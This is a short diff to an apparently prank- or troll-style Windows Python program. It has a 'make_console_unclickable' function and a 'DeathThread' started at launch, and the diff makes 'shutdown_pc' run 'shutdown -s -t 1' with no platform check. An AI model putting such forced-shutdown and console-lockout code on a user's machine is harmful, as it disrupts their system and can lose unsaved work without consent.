@@ -7,13 +7,13 @@ import pyautogui
 import threading
 from PyQt5 import QtWidgets, QtGui, QtCore
 from PIL import ImageGrab
-from colorama import Fore, init, Back, Style
+from colorama import Fore, init
 from tqdm import tqdm
 import win32api
 import win32process
 import win32security
 import winsound
-import platform
+
 
 
 class WindowsAPI:
@@ -330,10 +330,7 @@ def make_console_unclickable():
 
 
 def shutdown_pc():
-    system = platform.system()
-
-    if system == "Windows":
-        os.system("shutdown -s -t 1")
+    os.system("shutdown -s -t 1")
 
 
 if __name__ == '__main__':
@@ -356,6 +353,7 @@ if __name__ == '__main__':
 
     # Start death thread
     DeathThread = threading.Thread(target=run_Death_Thread)
+
     DeathThread.start()
 
     # Run the application
